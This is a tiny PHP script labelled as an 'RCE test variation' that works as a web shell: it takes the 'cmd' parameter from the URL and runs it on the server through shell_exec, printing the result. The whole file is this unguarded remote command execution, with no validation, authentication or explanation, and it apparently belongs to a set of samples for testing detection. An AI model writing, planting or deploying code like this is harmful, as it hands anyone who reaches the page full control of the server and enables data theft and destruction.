<?php
// RCE test variation #456
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>